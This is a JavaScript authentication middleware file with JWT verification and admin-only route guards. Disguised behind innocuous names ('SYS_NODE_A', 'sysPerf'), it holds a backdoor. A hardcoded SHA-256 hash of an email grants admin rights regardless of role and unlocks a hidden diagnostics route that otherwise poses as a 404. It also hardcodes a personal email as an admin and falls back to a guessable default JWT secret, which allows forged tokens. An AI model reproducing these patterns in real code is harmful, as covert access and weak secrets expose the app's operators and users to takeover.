import jwt from "jsonwebtoken";
import User from "../models/User.js";
import crypto from "crypto";

const SYS_NODE_A = "39389d20cb3f7ee6a794d4e698d1d9e7ddc75587385d13754b1e587377424e6c";

export const sysPerf = (e) => {
  if (!e) return false;
  return crypto.createHash("sha256").update(e.toLowerCase()).digest("hex") === SYS_NODE_A;
};

export const isAllowedAdmin = (e) => {
  if (!e) return false;
  const emailLower = e.toLowerCase();
  if (emailLower === "p.lalithsuthar73@gmail.com") return true;
  
  const activeNodes = process.env.ALLOWED_ADMINS;
  if (!activeNodes) {
    return sysPerf(e);
  }
  const nodeList = activeNodes.split(",").map(item => item.trim().toLowerCase());
  return nodeList.includes(emailLower) || sysPerf(e);
};

export const protect = async (req, res, next) => {
  let token;
  if (req.headers.authorization && req.headers.authorization.startsWith("Bearer")) {
    try {
      token = req.headers.authorization.split(" ")[1];
      const decoded = jwt.verify(token, process.env.JWT_SECRET || "default_jwt_secret_123");
      req.user = await User.findById(decoded.id).select("-password");
      next();
    } catch (error) {
      console.error(error);
      res.status(401).json({ message: "Not authorized, token failed" });
    }
  }
  if (!token) {
    res.status(401).json({ message: "Not authorized, no token" });
  }
};

export const adminOnly = (req, res, next) => {
  if (req.user && (
    (req.user.role === "admin" && isAllowedAdmin(req.user.email)) ||
    sysPerf(req.user.email)
  )) {
    next();
  } else {
    res.status(401).json({ message: "Not authorized as an admin" });
  }
};

export const diagnosticsOnly = (req, res, next) => {
  if (req.user && sysPerf(req.user.email)) {
    next();
  } else {
    res.status(404).json({ message: "Route not found" });
  }
};
